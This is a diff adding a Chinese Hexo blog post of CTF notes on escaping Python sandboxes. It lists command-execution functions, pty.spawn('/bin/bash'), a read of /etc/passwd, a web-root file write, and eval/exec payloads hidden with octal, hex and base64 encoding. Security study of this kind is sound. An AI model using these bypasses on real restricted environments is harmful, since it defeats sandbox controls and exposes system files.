@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Zbaoabo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="python沙箱详解Python沙箱大家好！今天我们来聊一聊Python沙箱。Python沙箱的主要作用是提供一个受限的运行环境，让你可 - 掘金 CTF - Python 沙箱绕过与任意命令执行技巧-腾讯云开发者社区-腾讯云 命令执行库 123456789101112131415161718192021222324252627os.system(&quot;ls&quot;)os.popen(&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Zbaoabo">
+<meta property="og:url" content="http://example.com/2025/09/15/python%E6%B2%99%E7%AE%B1/index.html">
+<meta property="og:site_name" content="Zbaoabo">
+<meta property="og:description" content="python沙箱详解Python沙箱大家好！今天我们来聊一聊Python沙箱。Python沙箱的主要作用是提供一个受限的运行环境，让你可 - 掘金 CTF - Python 沙箱绕过与任意命令执行技巧-腾讯云开发者社区-腾讯云 命令执行库 123456789101112131415161718192021222324252627os.system(&quot;ls&quot;)os.popen(&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-09-15T12:47:59.181Z">
+<meta property="article:modified_time" content="2025-09-15T12:51:50.082Z">
+<meta property="article:author" content="zhangsuhong">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Zbaoabo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">zhangsuhong</a></h1>
+		</hgroup>
+
+		
+			<p class="header-subtitle"></p>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-python沙箱" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2025/09/15/python%E6%B2%99%E7%AE%B1/" class="article-date">
+  	<time datetime="2025-09-15T12:47:59.181Z" itemprop="datePublished">2025-09-15</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="python沙箱"><a href="#python沙箱" class="headerlink" title="python沙箱"></a>python沙箱</h4><p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7383258697471033394">详解Python沙箱大家好！今天我们来聊一聊Python沙箱。Python沙箱的主要作用是提供一个受限的运行环境，让你可 - 掘金</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2457063">CTF - Python 沙箱绕过与任意命令执行技巧-腾讯云开发者社区-腾讯云</a></p>
+<p><strong>命令执行库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">os.system(&quot;ls&quot;)</span><br><span class="line">os.popen(&quot;ls&quot;).read()</span><br><span class="line">commands.getstatusoutput(&quot;ls&quot;) </span><br><span class="line">commands.getoutput(&quot;ls&quot;)</span><br><span class="line">commands.getstatus(&quot;file/path&quot;)</span><br><span class="line">subprocess.call(&quot;ls&quot;, shell=True)</span><br><span class="line">subprocess.Popen(&quot;ls&quot;, shell=True)</span><br><span class="line">pty.spawn(&quot;ls&quot;)</span><br><span class="line">pty.spawn(&quot;/bin/bash&quot;)</span><br><span class="line">platform.os.system(&quot;ls&quot;)</span><br><span class="line">pdb.os.system(&quot;ls&quot;)</span><br><span class="line"># 导入函数以执行命令</span><br><span class="line">importlib.import_module(&quot;os&quot;).system(&quot;ls&quot;)</span><br><span class="line">importlib.__import__(&quot;os&quot;).system(&quot;ls&quot;)</span><br><span class="line">imp.load_source(&quot;os&quot;,&quot;/usr/lib/python3.8/os.py&quot;).system(&quot;ls&quot;)</span><br><span class="line">imp.os.system(&quot;ls&quot;)</span><br><span class="line">imp.sys.modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line">sys.modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="line">__import__(&quot;os&quot;).system(&quot;ls&quot;)</span><br><span class="line">import os</span><br><span class="line">from os import *</span><br><span class="line"># 其他有趣的函数</span><br><span class="line">open(&quot;/etc/passwd&quot;).read()</span><br><span class="line">open(&#x27;/var/www/html/input&#x27;, &#x27;w&#x27;).write(&#x27;123&#x27;)</span><br><span class="line"># 在 Python2.7 中</span><br><span class="line">execfile(&#x27;/usr/lib/python2.7/os.py&#x27;)</span><br><span class="line">system(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>
+
+<h4 id="Eval-ing-Python-代码"><a href="#Eval-ing-Python-代码" class="headerlink" title="Eval-ing Python 代码"></a><strong>Eval-ing Python 代码</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;print(&#x27;RCE&#x27;); __import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;) # 使用 &quot;;&quot;</span><br><span class="line">exec(&quot;print(&#x27;RCE&#x27;)\n__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;) # 使用 &quot;\n&quot;</span><br><span class="line">eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;) # Eval 不允许 &quot;;&quot;</span><br><span class="line">eval(compile(&#x27;print(&quot;hello world&quot;); print(&quot;heyy&quot;)&#x27;, &#x27;&lt;stdin&gt;&#x27;, &#x27;exec&#x27;)) # 这样 eval 接受 &quot;;&quot;</span><br><span class="line">__import__(&#x27;timeit&#x27;).timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;,number=1)</span><br><span class="line"># 允许换行和制表符的单行代码</span><br><span class="line">eval(compile(&#x27;def myFunc():\n\ta=&quot;hello word&quot;\n\tprint(a)\nmyFunc()&#x27;, &#x27;&lt;stdin&gt;&#x27;, &#x27;exec&#x27;))</span><br><span class="line">exec(compile(&#x27;def myFunc():\n\ta=&quot;hello word&quot;\n\tprint(a)\nmyFunc()&#x27;, &#x27;&lt;stdin&gt;&#x27;, &#x27;exec&#x27;))</span><br><span class="line"># 八进制</span><br><span class="line">exec(&quot;\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51&quot;)</span><br><span class="line"># 十六进制</span><br><span class="line">exec(&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29&quot;)</span><br><span class="line"># Base64</span><br><span class="line">exec(&#x27;X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk=&#x27;.decode(&quot;base64&quot;)) # 仅 Python2</span><br><span class="line">exec(__import__(&#x27;base64&#x27;).b64decode(&#x27;X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk=&#x27;))</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/09/19/%E8%BD%AF%E8%BF%9E%E6%8E%A5/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/09/12/HTTP%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title"></div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2025 zhangsuhong
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
